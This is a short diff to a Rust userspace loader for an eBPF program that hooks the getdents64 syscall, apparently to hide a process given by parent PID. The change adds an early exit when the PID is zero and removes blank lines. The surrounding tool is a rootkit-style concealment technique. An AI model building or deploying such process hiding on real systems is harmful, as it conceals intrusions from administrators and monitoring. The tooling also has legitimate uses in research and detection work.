@@ -14,6 +14,12 @@ struct TargetPpid {
 #[tokio::main]
 async fn main() -> Result<(), anyhow::Error> {
     let opt = TargetPpid::parse();
+
+    if opt.ppid == 0 {
+        println!("ppid is 0, nothing to hide");
+        return Ok(());
+    }
+
     let _line = opt.ppid.to_string();
     let mut line: [u8; MAX_FILE_LEN] = [0; MAX_FILE_LEN];
     line[.._line.len()].copy_from_slice(_line.as_bytes());
@@ -56,8 +62,6 @@ async fn main() -> Result<(), anyhow::Error> {
 
     program.load()?;
     program.attach("syscalls", "sys_enter_getdents64")?;
-
-
 
     let mut prog_array = ProgramArray::try_from(bpf.take_map("JUMP_TABLE").unwrap())?;
 
